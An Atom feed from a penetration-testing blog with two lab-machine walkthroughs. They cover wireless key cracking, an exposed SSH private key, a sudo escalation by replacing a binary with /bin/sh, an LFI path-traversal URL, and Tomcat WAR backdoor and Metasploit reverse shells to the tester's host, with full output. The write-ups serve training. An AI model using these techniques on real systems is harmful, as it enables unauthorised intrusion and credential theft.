<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: penetration testing | Core dump overflow]]></title>
  <link href="http://chousensha.github.io/blog/categories/penetration-testing/atom.xml" rel="self"/>
  <link href="http://chousensha.github.io/"/>
  <updated>2019-09-09T19:54:37+03:00</updated>
  <id>http://chousensha.github.io/</id>
  <author>
    <name><![CDATA[chousensha]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[There be Tr0lls - Part 3]]></title>
    <link href="http://chousensha.github.io/blog/2019/09/09/there-be-tr0lls-part-3/"/>
    <updated>2019-09-09T19:35:37+03:00</updated>
    <id>http://chousensha.github.io/blog/2019/09/09/there-be-tr0lls-part-3</id>
    <content type="html"><![CDATA[<p>The Tr0ll is back with the 3rd machine in the series!</p>

<!-- more -->


<h2>start with credentials in plaintext</h2>

<p>The start is atypical..the machine only has the SSH port open, and in the author description we are told to <code>start:here</code> for the login..so let&rsquo;s try to SSH with these credentials. It works and we are in right away.</p>

<p><code>
start@Tr0ll3:~$ ls
bluepill  redpill
</code></p>

<p>If you take the bluepill, you are being taught the secrets of how to make a hacker waste time.</p>

<p><code>
start@Tr0ll3:~/bluepill$ cat awesome_work
http://bfy.tw/ODa
</code></p>

<p>With the redpill, we find a password..or we&rsquo;re being trolled:</p>

<p><code>
start@Tr0ll3:~/redpill$ cat this_will_surely_work
step2:Password1!
</code></p>

<p>Jumping straight into enumeration with LinEnum, we notice there are many potentially interesting users on the system:</p>

<p><code>
maleus
wytshadow
genphlux
eagle
</code></p>

<p>When searching for world writable files, we find the following:</p>

<p><code>
-] Files not owned by user but writable by group:
-rwxrwxrwx 1 root root 49962 Aug  2 00:23 /var/log/.dist-manage/wytshadow.cap
-rwxrwxrwx 1 eagle russ 35737600 Aug  2 00:24 /.hints/lol/rofl/roflmao/this/isnt/gonna/stop/anytime/soon/still/going/lol/annoyed/almost/there/jk/no/seriously/last/one/rofl/ok/ill/stop/however/this/is/fun/ok/here/rofl/sorry/you/made/it/gold_star.txt
</code></p>

<p>We also find possible credentials for the eagle user among the files owned by the start user:</p>

<p><code>
start@Tr0ll3:~$ cat /home/start/.../about_time
eagle:oxxwJo
</code></p>

<p>I transferred the capture file to my machine, also checked the contents of that troll file, it was filled with blocks of strings like these:</p>

<p><code>
QBu4rIhKXJ
DKbpcZQpO3
T7JUfO0jjZ
</code></p>

<p>Before looking at the exfiltrated file, I switched to the user eagle with the above password.</p>

<h2>Be the eagle &ndash; wireless traffic cracking</h2>

<p>The packet capture file contains wireless traffic, so I thought about cracking it with aircrack-ng. For the first attempt, I fed it the gold_star.txt file as wordlist, and it found the passphrase in 5 minutes:</p>

<p><code>
aircrack-ng -w gold_star.txt wytshadow.cap
[...]
KEY FOUND! [ gaUoCe34t1 ]
</code></p>

<p>There was nothing particularly interesting from eagle&rsquo;s point of view, other than the sudo privilege for starting the vsftpd service:</p>

<p>```
User eagle may run the following commands on Tr0ll3:</p>

<pre><code>(root) /usr/sbin/service vsftpd start
</code></pre>

<p>```</p>

<p>We keep this option on the bench for now, since we have something else to work with. We know there&rsquo;s a wytshadow user, and the .cap file had the same name, so I used the key as password for this account and new user, new shell!</p>

<h2>wytshadow and the Lynx</h2>

<p>Inside the home directory we find a SUID executable:</p>

<p><code>
-rwsrwxrwx  1 genphlux  root      8566 Jun 17  2015 oohfun
wytshadow@Tr0ll3:~$ file oohfun
oohfun: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.24, BuildID[sha1]=309f4fec949b0e2eb3f6ec83ccadff89c553e397, not stripped
</code></p>

<p>If we run it, we see the string &ldquo;iM Cr@zY L1k3 AAA LYNX&rdquo; printed continuously on the screen. If we look in the strings of the file, we see a reference to a shell script:</p>

<p><code>
/lol/bin/run.sh -b 0.0.0.0
</code></p>

<p>If we look at that file, we see it does exactly what we saw earlier, printing the string in an infinite loop:</p>

<p>```
wytshadow@Tr0ll3:~$ cat /lol/bin/run.sh</p>

<h1>!/bin/sh</h1>

<p>while true;do echo &ldquo;iM Cr@zY L1k3 AAA LYNX&rdquo;; done
```</p>

<p>We don&rsquo;t have permissions to further enumerate the /lol directory. I checked the sudo privileges, and this user can start an Nginx server:</p>

<p>```
User wytshadow may run the following commands on Tr0ll3:</p>

<pre><code>(root) /usr/sbin/service nginx start
</code></pre>

<p>```</p>

<p>The server is listening on port 8080, but we get a 403 Forbidden error when trying to access it.</p>

<p><code>
roto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      -
</code></p>

<p>If we look in the Nginx configuration files, we find the server expects a user agent of Lynx, and now it all makes sense. Lynx is a CLI browser.</p>

<p>```
wytshadow@Tr0ll3:~$ cat /etc/nginx/sites-available/default
if ($http_user_agent !~ &ldquo;Lynx*&rdquo;){</p>

<pre><code>return 403;
</code></pre>

<p>```</p>

<p>I already had it on Kali, so I used it to browse to the newly opened web server and was handed the credentials for the genphlux user:</p>

<p><code>
lynx http://192.168.159.143:8080/
genphlux:HF9nd0cR!
</code></p>

<h2>genphlux &ndash; Unprotected SSH keys</h2>

<p>Inside the home directory we immediately find the SSH private key of the maleus user!</p>

<p><code>
genphlux@Tr0ll3:~$ cat maleus
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAwz5Hwer48U1t/Qi9JveuO+Z7WQlnmhOOs/2pZ0he/OyVsEFv
DsGib1wu/N8t+7h9JZK9x2GL33TXQBVCy6TxES90F1An+2DSza6lJPCyhcgK/DEp
yxSVt32A+lFo+PQJV6QYZlpRkek0MjUw5y/E5qZwdBypC55C4QzgQBN3+Lnuhuk4
u52xcK9/6/2N7JZCNYA21Tp1Uy9mty/65IT7OwKJd2rXp3O6rZYTD/vPl+Rt/LtN
gA1DbDODq0NCmvcrZL+SafSj+MABA3LCERw01gA4RMdyxJU6hVfjeSKOdwDQOGWe
eAVCL2GR/frwyf+rfN1kbpdw/RGXWWwVANMcaQIDAQABAoIBAGNudFztrZo2NK2I
pcwSl0kqN+dAQuLU0vgXVw6ibL2iPxlkOYrqUi8kY0mk32YyrolUEhJYO0Ox3W1l
Zn8PoTV/VUAKMlJzHOhi6PfHHSPEnNOSthYWhajM4cKZczxWC+v2RfbaSHBms45e
SGl0inJskRiRAAZKswSp6gq334FrS6Dwy1tiKvzCfR3kLQghV5U/PhFZCsq3xvAw
eXPx2toNtU2gYSGrKWTep+nAKM1neBxeZAujYuN4xJ5/Th2y0pyTvX9WEgzKPJ/G
PlYZYCUAKPCbabYSuZckjeiN1aS52AIFedECBfAIezOr08Wx/bI/xCOgBxrQgPrK
kRvlOYECgYEA5eCIEfdLhWdg3ltadYE0O5VAoXKrbxYWqSyw1Eyeqj0N1qD9Rsvg
jIQJazV5JcVBIF54f/jlCJozR5s5AELrY0Z/krea1lF5ecOSUQE3tp94298xzO3g
7BBe3g6pD56Cya/Vo0+YVQmAnBHLh6QIYvUUXXN2IyceT8fhEx5JA+sCgYEA2W4z
KKMVAdPxKcjVks1zdGmVlj1RsUkakYuLWV3jQe2w1naJrc37Khy5eWZaRJhXqeBb
1cvTMa+r/BF7jvItxglWoBJqXDxKI0a6KqWtloZL2ynoaBkAhR2btob6nSN63Bpg
ZYJKY1B5yYbDHK4k6QT7atn2g6DAv/7sW6skj/sCgYA16WTAIek6TjZvr6kVacng
N27C7mu6T8ncvzhxcc68SjlWnscHtYTiL40t8YqKCyrs9nr4OF0umUtxfbvujcM6
syv0Ms9DeDQvFGjaSpjQYbIsjrnVP+zCMEyvc2y+1wQBXRWTiXVGbEYXVC0RkKzO
2H+AMzX/pIr9Vvk4TJ//JQKBgFNJcy9NyO46UVbAJ49kQ6WEDFjQhEp0xkiaO3aw
EC1g7yw3m+WH0X4AIsvt+QXtlSbtWkA7I1sU/7w+tiW7fu0tBpGqfDN4pK1+mjFb
5XKTXttE4lF9wkU7Yjo42ib3QEivkd1QW05PtVcM2BBUZK8dyXDUrSkemrbw33j9
xbOhAoGBAL8uHuAs68ki/BWcmWUUer7Y+77YI/FFm3EvP270K5yn0WUjDJXwHpuz
Fg3n294GdjBtQmvyf2Wxin4rxl+1aWuj7/kS1/Fa35n8qCN+lkBzfNVA7f626KRA
wS3CudSkma8StmvgGKIU5YcO8f13/3QB6PPBgNoKnF5BlFFQJqhK
-----END RSA PRIVATE KEY-----
</code></p>

<p>I was curious about what was inside /lol, it appears to be a JBoss installation:</p>

<p><code>
genphlux@Tr0ll3:/lol$ ls
bin  client  common  copyright.txt  docs  jar-versions.xml  JBossORG-EULA.txt  lgpl.html  lib  readme.html  server
</code></p>

<p>genphlux can also start an Apache server:</p>

<p><code>
User genphlux may run the following commands on Tr0ll3:
(root) /usr/sbin/service apache2 start
</code></p>

<p>I started the server, also getting a 403 Forbidden, lynx or not. Moving on for now, I SSH'ed in as maleus with the found private key.</p>

<h2>maleus &ndash; don&rsquo;t even bother</h2>

<p>Inside his home we find another binary:</p>

<p><code>
maleus@Tr0ll3:~$ file dont_even_bother
dont_even_bother: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.24, BuildID[sha1]=455a77b2503f19c1a09cbc9b66d513b2fa3af73c, not stripped
</code></p>

<p>This binary asks for a password:</p>

<p>```
maleus@Tr0ll3:~$ ./dont_even_bother</p>

<p> Enter the password :
das</p>

<p> Wrong Password
```</p>

<p>And in the strings we find a message for finding the correct password probably:</p>

<p><code>
 Your reward is just knowing you did it! :-P
</code></p>

<p>This reward isn&rsquo;t really that enticing, so I didn&rsquo;t jump into reversing this, it might be a troll dead end. I continued looking through the home folder and found a possible password inside the <em>.viminfo</em> file:</p>

<p>```</p>

<h1>Registers:</h1>

<p>&ldquo;"1 LINE    0
 passwd
"2  LINE    0
 B<sup>slc8I</sup>$
"3  LINE    0
 passswd
```</p>

<p>In the .viminfo file you can find information that persists throughout vim runs. If you don&rsquo;t disable the vim logging, you can expect to find things you typed / pasted / edited, like passwords in this case. A useful blog that describes this in more detail is <a href="http://technotes.whw1.com/computer-related/development/programming/58-how-to-stop-vim-logging-info-into-viminfo">http://technotes.whw1.com/computer-related/development/programming/58-how-to-stop-vim-logging-info-into-viminfo</a></p>

<p>The password belongs to maleus and now we can check his sudo privileges. We find out he can run the executable from earlier as root:</p>

<p>```
User maleus may run the following commands on Tr0ll3:</p>

<pre><code>(root) /home/maleus/dont_even_bother
</code></pre>

<p>```</p>

<p>From the strings, we already assume the executable itself is just a troll. However, maleus has write privileges over this file:</p>

<p><code>
maleus@Tr0ll3:~$ ls -l
total 12
-rwxrwxr-x 1 maleus maleus 8674 Jun 18  2015 dont_even_bother
</code></p>

<p>So we can just replace this useless binary with one that would give us a root shell:</p>

<p>```
maleus@Tr0ll3:~$ cat /bin/sh > dont_even_bother
maleus@Tr0ll3:~$ sudo ./dont_even_bother
[sudo] password for maleus:</p>

<h1>cat /root/flag.txt</h1>

<p>You are truly a Jedi!</p>

<p>Twitter Proof:</p>

<p>Pr00fThatTh3L33tHax0rG0tTheFl@g!!</p>

<p>@Maleus21
```</p>

<p>This was another fun machine in the series. In the end, we trolled the troll again!</p>

<p>```</p>

<hr />

<p>/ QOTD:                                  \
|                                        |
\ All I want is more than my fair share. /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[No Mercy]]></title>
    <link href="http://chousensha.github.io/blog/2019/06/09/no-mercy/"/>
    <updated>2019-06-09T21:43:54+03:00</updated>
    <id>http://chousensha.github.io/blog/2019/06/09/no-mercy</id>
    <content type="html"><![CDATA[<p>Today&rsquo;s VM is inspired from the OSCP labs!</p>

<!-- more -->


<p>There are quite a few ports open, and some filtered:</p>

<p><code>
PORT     STATE    SERVICE     VERSION
22/tcp   filtered ssh
53/tcp   open     domain      ISC BIND 9.9.5-3ubuntu0.17 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.9.5-3ubuntu0.17-Ubuntu
80/tcp   filtered http
110/tcp  open     pop3        Dovecot pop3d
|_pop3-capabilities: SASL PIPELINING CAPA TOP UIDL AUTH-RESP-CODE STLS RESP-CODES
|_ssl-date: TLS randomness does not represent time
139/tcp  open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp  open     imap        Dovecot imapd (Ubuntu)
|_imap-capabilities: STARTTLS more have IMAP4rev1 post-login ID listed SASL-IR LOGINDISABLEDA0001 ENABLE LITERAL+ capabilities LOGIN-REFERRALS IDLE Pre-login OK
|_ssl-date: TLS randomness does not represent time
445/tcp  open     netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
993/tcp  open     ssl/imaps?
|_ssl-date: TLS randomness does not represent time
995/tcp  open     ssl/pop3s?
|_ssl-date: TLS randomness does not represent time
8080/tcp open     http        Apache Tomcat/Coyote JSP engine 1.1
| http-methods:
|_  Potentially risky methods: PUT DELETE
|_http-open-proxy: Proxy might be redirecting requests
| http-robots.txt: 1 disallowed entry
|_/tryharder/tryharder
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat
</code></p>

<p>The available web server is a Tomcat installation. In the <a href="http://192.168.159.137:8080/tryharder/tryharder">http://192.168.159.137:8080/tryharder/tryharder</a> we find a base64 string:</p>

<p><code>
SXQncyBhbm5veWluZywgYnV0IHdlIHJlcGVhdCB0aGlzIG92ZXIgYW5kIG92ZXIgYWdhaW46IGN5YmVyIGh5Z2llbmUgaXMgZXh0cmVtZWx5IGltcG9ydGFudC4gUGxlYXNlIHN0b3Agc2V0dGluZyBzaWxseSBwYXNzd29yZHMgdGhhdCB3aWxsIGdldCBjcmFja2VkIHdpdGggYW55IGRlY2VudCBwYXNzd29yZCBsaXN0LgoKT25jZSwgd2UgZm91bmQgdGhlIHBhc3N3b3JkICJwYXNzd29yZCIsIHF1aXRlIGxpdGVyYWxseSBzdGlja2luZyBvbiBhIHBvc3QtaXQgaW4gZnJvbnQgb2YgYW4gZW1wbG95ZWUncyBkZXNrISBBcyBzaWxseSBhcyBpdCBtYXkgYmUsIHRoZSBlbXBsb3llZSBwbGVhZGVkIGZvciBtZXJjeSB3aGVuIHdlIHRocmVhdGVuZWQgdG8gZmlyZSBoZXIuCgpObyBmbHVmZnkgYnVubmllcyBmb3IgdGhvc2Ugd2hvIHNldCBpbnNlY3VyZSBwYXNzd29yZHMgYW5kIGVuZGFuZ2VyIHRoZSBlbnRlcnByaXNlLg==
</code></p>

<p>Decoding this hints at insecure passwords:</p>

<p>```
It&rsquo;s annoying, but we repeat this over and over again: cyber hygiene is extremely important. Please stop setting silly passwords that will get cracked with any decent password list.</p>

<p>Once, we found the password &ldquo;password&rdquo;, quite literally sticking on a post-it in front of an employee&rsquo;s desk! As silly as it may be, the employee pleaded for mercy when we threatened to fire her.</p>

<p>No fluffy bunnies for those who set insecure passwords and endanger the enterprise.
```</p>

<p>From all the other services, the one that seems most likely to be bruteforced is Samba. So let&rsquo;s have a look:</p>

<p>```
smbmap -H 192.168.159.137
[+] Finding open SMB ports&hellip;.
[+] Guest SMB session established on 192.168.159.137&hellip;
[+] IP: 192.168.159.137:445 Name: 192.168.159.137</p>

<pre><code>Disk                                                    Permissions
----                                                    -----------
print$                                              NO ACCESS
qiu                                                 NO ACCESS
IPC$                                                NO ACCESS
</code></pre>

<p>```</p>

<p>The <em>qiu</em> share is what we want to look at. Running <strong>enum4linux</strong> we find 2 accounts:</p>

<h1>```</h1>

<h1>|    Users on 192.168.159.137    |</h1>

<p>index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: pleadformercy    Name: QIU   Desc:
index: 0x2 RID: 0x3e9 acb: 0x00000010 Account: qiu  Name:   Desc:
```</p>

<p>Following the hint, I tried the share with a password of <em>password</em> and it worked for user <em>qiu</em>:</p>

<p><code>
smbclient //192.168.159.137/qiu -U qiu
Enter WORKGROUP\qiu's password:
Try "help" to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Fri Aug 31 15:07:00 2018
  ..                                  D        0  Mon Nov 19 11:59:09 2018
  .bashrc                             H     3637  Sun Aug 26 09:19:34 2018
  .public                            DH        0  Sun Aug 26 10:23:24 2018
  .bash_history                       H      163  Fri Aug 31 15:11:34 2018
  .cache                             DH        0  Fri Aug 31 14:22:05 2018
  .private                           DH        0  Sun Aug 26 12:35:34 2018
  .bash_logout                        H      220  Sun Aug 26 09:19:34 2018
  .profile                            H      675  Sun Aug 26 09:19:34 2018
</code></p>

<p>I mounted the share locally for easier browsing with <code>mount -t cifs //192.168.159.137/qiu /mnt/ctf -o username=qiu -o password=password</code>. Then I started looking through what we have. The .bash_history file shows us the last commands entered by user qiu:</p>

<p><code>
exit
cd ../
cd home
cd qiu
cd .secrets
ls -al
cd .private
ls
cd secrets
ls
ls -al
cd ../
ls -al
cd opensesame
ls -al
./configprint
sudo configprint
sudo su -
exit
</code></p>

<p>The .public folder contains a message that doesn&rsquo;t seem relevant but is sound advice!</p>

<p><code>
cat .public/resources/smiley
A cheerful smile to start the day is always good. :-)
</code></p>

<p>We have more to check inside .private:</p>

<p><code>
root@deck:/mnt/ctf/.private# ls
opensesame  readme.txt  secrets
</code></p>

<p>Readme contents are:</p>

<p><code>
This is for your own eyes only. In case you forget the magic rules for remote administration.
</code></p>

<p>The secrets folder is empty. Inside <em>opensesame</em> there&rsquo;s a config file that contains port knocking instructions for opening HTTP and SSH:</p>

<p>```
cat config
Here are settings for your perusal.</p>

<p>Port Knocking Daemon Configuration</p>

<p>[options]</p>

<pre><code>UseSyslog
</code></pre>

<p>[openHTTP]</p>

<pre><code>sequence    = 159,27391,4
seq_timeout = 100
command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 80 -j ACCEPT
tcpflags    = syn
</code></pre>

<p>[closeHTTP]</p>

<pre><code>sequence    = 4,27391,159
seq_timeout = 100
command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 80 -j ACCEPT
tcpflags    = syn
</code></pre>

<p>[openSSH]</p>

<pre><code>sequence    = 17301,28504,9999
seq_timeout = 100
command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
tcpflags    = syn
</code></pre>

<p>[closeSSH]</p>

<pre><code>sequence    = 9999,28504,17301
seq_timeout = 100
command     = /sbin/iptables -D iNPUT -s %IP% -p tcp --dport 22 -j ACCEPT
tcpflags    = syn
</code></pre>

<p>```</p>

<p>I used a quick Bash one-liner for the port knocking:</p>

<p><code>
for port in 159 27391 4; do nmap -Pn --host-timeout 100 --max-retries 0 -p $port 192.168.159.137; done
</code></p>

<p>Now port 80 was opened and we find a message stating that: &ldquo;This machine shall make you plead for mercy! Bwahahahahaha!&rdquo;. In the robots.txt file we find 2 entries:</p>

<p><code>
Disallow: /mercy
Disallow: /nomercy
</code></p>

<p>Inside /mercy there&rsquo;s an index file that hints at possible RCE:</p>

<p>```
Welcome to Mercy!</p>

<p>We hope you do not plead for mercy too much. If you do, please help us upgrade our website to allow our visitors to obtain more than just the local time of our system.
```</p>

<p>Inside /nomercy there&rsquo;s a <a href="https://github.com/robocoder/rips-scanner">RIPS installation</a>. RIPS is a PHP static scanner that looks for vulnerabilities in the source code.</p>

<p><img class="center" src="/images/pentest/mercy/rips.png" title="&lsquo;rips&rsquo; &lsquo;rips&rsquo;" ></p>

<p>The version 0.53 is vulnerable to a <a href="https://www.exploit-db.com/exploits/18660">LFI exploit</a>. Going to <a href="http://192.168.159.137/nomercy/windows/code.php?file=../../../../../../etc/passwd">http://192.168.159.137/nomercy/windows/code.php?file=../../../../../../etc/passwd</a> gives us the contents of the passwd file. Here are the last 4 users:</p>

<p><code>
&lt;? pleadformercy:x:1000:1000:pleadformercy:/home/pleadformercy:/bin/bash
&lt;? qiu:x:1001:1001:qiu:/home/qiu:/bin/bash
&lt;? thisisasuperduperlonguser:x:1002:1002:,,,:/home/thisisasuperduperlonguser:/bin/bash
&lt;? fluffy:x:1003:1003::/home/fluffy:/bin/sh
</code></p>

<p>With this LFI, we can take a look at the <code>/etc/tomcat7/tomcat-users.xml</code> to search for credentials:</p>

<p><code>
&lt;? &lt;role rolename="admin-gui"/&gt;
&lt;? &lt;role rolename="manager-gui"/&gt;
&lt;? &lt;user username="thisisasuperduperlonguser" password="heartbreakisinevitable" roles="admin-gui,manager-gui"/&gt;
&lt;? &lt;user username="fluffy" password="freakishfluffybunny" roles="none"/&gt;
</code></p>

<p>We can now login to Tomcat and upload a reverse shell. I used a nice tool called <a href="https://github.com/mgeeky/tomcatWarDeployer">tomcatWarDeployer</a> that automatically generates and deploys a JSP backdoor.</p>

<p>```
python tomcatWarDeployer.py -h
Usage: tomcatWarDeployer.py [options] server</p>

<p>  server        Specifies server address. Please also include port after colon. May start with <a href="http://">http://</a> or <a href="https://">https://</a></p>

<p>Options:
  -h, &mdash;help            show this help message and exit</p>

<p>  General options:</p>

<pre><code>-V, --version       Version information.
-v, --verbose       Verbose mode.
-s, --simulate      Simulate breach only, do not perform any offensive
                    actions.
-G OUTFILE, --generate=OUTFILE
                    Generate JSP backdoor only and put it into specified
                    outfile path then exit. Do not perform any
                    connections, scannings, deployment and so on.
-U USER, --user=USER
                    Tomcat Manager Web Application HTTP Auth username.
                    Default=&lt;none&gt;, will try various pairs.
-P PASS, --pass=PASS
                    Tomcat Manager Web Application HTTP Auth password.
                    Default=&lt;none&gt;, will try various pairs.
</code></pre>

<p>  Connection options:</p>

<pre><code>-H RHOST, --host=RHOST
                    Remote host for reverse tcp payload connection. When
                    specified, RPORT must be specified too. Otherwise,
                    bind tcp payload will be deployed listening on 0.0.0.0
-p PORT, --port=PORT
                    Remote port for the reverse tcp payload when used with
                    RHOST or Local port if no RHOST specified thus acting
                    as a Bind shell endpoint.
-u URL, --url=URL   Apache Tomcat management console URL. Default: empty
-t TIMEOUT, --timeout=TIMEOUT
                    Speciifed timeout parameter for socket object and
                    other timing holdups. Default: 10
</code></pre>

<p>  Payload options:</p>

<pre><code>-R, --remove        Remove deployed app with specified name. Can be used
                    for post-assessment cleaning
-X PASSWORD, --shellpass=PASSWORD
                    Specifies authentication password for uploaded shell,
                    to prevent unauthenticated usage. Default: randomly
                    generated. Specify "None" to leave the shell
                    unauthenticated.
-T TITLE, --title=TITLE
                    Specifies head&gt;title for uploaded JSP WAR payload.
                    Default: "JSP Application"
-n APPNAME, --name=APPNAME
                    Specifies JSP application name. Default: "jsp_app"
-x, --unload        Unload existing JSP Application with the same name.
                    Default: no.
-C, --noconnect     Do not connect to the spawned shell immediately. By
                    default this program will connect to the spawned
                    shell, specifying this option let's you use other
                    handlers like Metasploit, NetCat and so on.
-f WARFILE, --file=WARFILE
                    Custom WAR file to deploy. By default the script will
                    generate own WAR file on-the-fly.
</code></pre>

<p>```</p>

<p>All I had to do was provide the credentials and the host/port combination. The host specified by the -H flag is where I&rsquo;m expecting the shell:</p>

<p>```
python tomcatWarDeployer.py -v -x -p 8888 -H 192.168.159.129 192.168.159.137:8080 -U thisisasuperduperlonguser -P heartbreakisinevitable</p>

<pre><code>    tomcatWarDeployer (v. 0.5.2)
Apache Tomcat auto WAR deployment &amp; launching tool
Mariusz B. / MGeeky '16-18
</code></pre>

<p>Penetration Testing utility aiming at presenting danger of leaving Tomcat misconfigured.</p>

<p>INFO: Reverse shell will connect to: 192.168.159.129:8888.
DEBUG: Trying Creds: [&ldquo;thisisasuperduperlonguser:heartbreakisinevitable&rdquo;]:</p>

<pre><code>Browsing to "http://192.168.159.137:8080/"...
</code></pre>

<p>DEBUG: Trying to fetch: &ldquo;<a href="http://192.168.159.137:8080/">http://192.168.159.137:8080/</a>&rdquo;
DEBUG: Trying to fetch: &ldquo;<a href="http://192.168.159.137:8080/manager">http://192.168.159.137:8080/manager</a>&rdquo;
DEBUG: Probably found something: Apache Tomcat/7.0.52 (Ubuntu)
INFO: Apache Tomcat/7.0.52 (Ubuntu) Manager Application reached &amp; validated.
INFO:   At: &ldquo;<a href="http://192.168.159.137:8080/manager">http://192.168.159.137:8080/manager</a>&rdquo;
DEBUG: Generating JSP WAR backdoor code&hellip;
DEBUG: Preparing additional code for Reverse TCP shell
DEBUG: Generating temporary structure for jsp_app WAR at: &ldquo;/tmp/tmpjo2Kgz&rdquo;
DEBUG: Working with Java at version: 11.0.3
DEBUG: Generating web.xml with servlet-name: &ldquo;JSP Application&rdquo;
DEBUG: Generating WAR file at: &ldquo;/tmp/jsp_app.war&rdquo;
DEBUG: adding: META-INF/ (in=0) (out=0) (stored 0%)
adding: META-INF/MANIFEST.MF (in=56) (out=56) (stored 0%)
adding: files/ (in=0) (out=0) (stored 0%)
adding: files/META-INF/ (in=0) (out=0) (stored 0%)
adding: files/META-INF/MANIFEST.MF (in=66) (out=65) (deflated 1%)
adding: files/WEB-INF/ (in=0) (out=0) (stored 0%)
adding: files/WEB-INF/web.xml (in=505) (out=254) (deflated 49%)
adding: index.jsp (in=4498) (out=1688) (deflated 62%)</p>

<h2>Total:</h2>

<p>(in = 5109) (out = 2917) (deflated 42%)
DEBUG: Tree command not available. Skipping.
DEBUG: WAR file structure:
DEBUG:
DEBUG: Checking if app jsp_app is deployed at: <a href="http://192.168.159.137:8080/manager">http://192.168.159.137:8080/manager</a>
DEBUG: App not deployed.
INFO: It looks that the application with specified name &ldquo;jsp_app&rdquo; has not been deployed yet.
DEBUG: Deploying application: jsp_app from file: &ldquo;/tmp/jsp_app.war&rdquo;
DEBUG: Removing temporary WAR directory: &ldquo;/tmp/tmpjo2Kgz&rdquo;
INFO: WAR DEPLOYED! Invoking it&hellip;
DEBUG: Spawned shell handling thread. Awaiting for the event&hellip;
DEBUG: Awaiting for reverse-shell handler to set-up
DEBUG: Establishing listener for incoming reverse TCP shell at 192.168.159.129:8888
DEBUG: Socket is binded to local port now, awaiting for clients&hellip;
DEBUG: Invoking application at url: &ldquo;<a href="http://192.168.159.137:8080/jsp_app/">http://192.168.159.137:8080/jsp_app/</a>&rdquo;
DEBUG: Adding &lsquo;X-Pass: u48rHHa9MRdK&rsquo; header for shell functionality authentication.
DEBUG: Incoming client: 192.168.159.137:60760
DEBUG: Application invoked correctly.
INFO: &mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;
INFO: JSP Backdoor up &amp; running on <a href="http://192.168.159.137:8080/jsp_app/">http://192.168.159.137:8080/jsp_app/</a>
INFO:
Happy pwning. Here take that password for web shell: &lsquo;u48rHHa9MRdK&rsquo;
INFO: &mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;</p>

<p>INFO: Connected with: tomcat7@MERCY</p>

<p>tomcat7@MERCY $
```</p>

<p>Unfortunately, I found this shell too unstable, so I switched to Metasploit and spawned a Meterpreter shell:</p>

<p>```
msf5 exploit(multi/http/tomcat_mgr_upload) > run</p>

<p>[<em>] Started reverse TCP handler on 192.168.159.129:4444
[</em>] Retrieving session ID and CSRF token&hellip;
[<em>] Uploading and deploying oAsjCH3JZVzYcanqTIdZkOcn&hellip;
[</em>] Executing oAsjCH3JZVzYcanqTIdZkOcn&hellip;
[<em>] Undeploying oAsjCH3JZVzYcanqTIdZkOcn &hellip;
[</em>] Sending stage (53844 bytes) to 192.168.159.137
[*] Meterpreter session 2 opened (192.168.159.129:4444 &ndash;> 192.168.159.137:41182) at 2019-06-04 11:04:16 -0400</p>

<p>meterpreter >
```</p>

<p>I dropped into a shell and upgraded it to a proper terminal with <code>python -c &lsquo;import pty; pty.spawn(&ldquo;/bin/bash&rdquo;)&rsquo;</code>. From this shell, I was able to switch to user fluffy with the previously found password of <code>freakishfluffybunny</code>.</p>

<p>```
tomcat7@MERCY:/var/lib/tomcat7$ su fluffy
su fluffy
Password: freakishfluffybunny</p>

<p>Added user fluffy.
$ python -c &lsquo;import pty; pty.spawn(&ldquo;/bin/bash&rdquo;)&rsquo;
python -c &lsquo;import pty; pty.spawn(&ldquo;/bin/bash&rdquo;)&rsquo;
fluffy@MERCY:~$ ls -a
ls -a
.  ..  .bash_history  .private
```</p>

<p>There are a few interesting files in fluffy&rsquo;s home:</p>

<p><code>
fluffy@MERCY:~/.private/secrets$ ls -a
ls -a
.  ..  backup.save  .secrets  timeclock
</code></p>

<p>The backup.save file is a shell script that just outputs a text:</p>

<p>```
cat backup.save</p>

<h1>!/bin/bash</h1>

<p>echo Backing Up Files;
```</p>

<p>In .secrets we have a Try harder! message. And the timeclock outputs the current date and time inside the web folder:</p>

<p>```
luffy@MERCY:~/.private/secrets$ cat timeclock
cat timeclock</p>

<h1>!/bin/bash</h1>

<p>now=$(date)
echo &ldquo;The system time is: $now.&rdquo; > ../../../../../var/www/html/time
echo &ldquo;Time check courtesy of LINUX&rdquo; >> ../../../../../var/www/html/time
chown www-data:www-data ../../../../../var/www/html/time
```</p>

<p>This should be the local time reference from earlier. What&rsquo;s more interesting, this script is owned by root and everyone has full permissions on it:</p>

<p><code>
-rwxrwxrwx 1 root   root   222 Nov 20  2018 timeclock
</code></p>

